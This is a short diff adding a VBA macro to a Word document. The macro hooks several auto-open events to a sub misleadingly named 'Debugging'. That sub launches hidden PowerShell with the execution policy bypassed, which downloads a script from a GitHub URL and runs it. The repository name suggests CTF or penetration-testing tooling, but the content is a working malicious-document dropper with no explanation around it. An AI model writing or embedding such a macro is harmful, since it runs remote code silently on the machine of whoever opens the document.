@@ -1,0 +1,22 @@
+Private Sub AutoOpen()
+    Debugging
+End Sub
+
+Private Sub Document_Open()
+    Debugging
+End Sub
+Private Sub Auto_Open()
+    Debugging
+End Sub
+
+Private Sub DocumentOpen()
+    Debugging
+End Sub
+
+Private Sub Debugging()
+    Dim wsh As Object
+    Set wsh = VBA.CreateObject("WScript.Shell")
+    Dim waitOnReturn As Boolean: waitOnReturn = False
+    Dim windowStyle As Integer: windowStyle = 0
+    wsh.Run "powershell.exe -Executionpolicy bypass -W hidden -NoP iex (new-object net.webclient).downloadstring(https://github.com/OlivierLaflamme/CTF-Script-And-Template-Thrift-Shop/new/master/macro_word.txt')", windowStyle, waitOnReturn
+End Sub
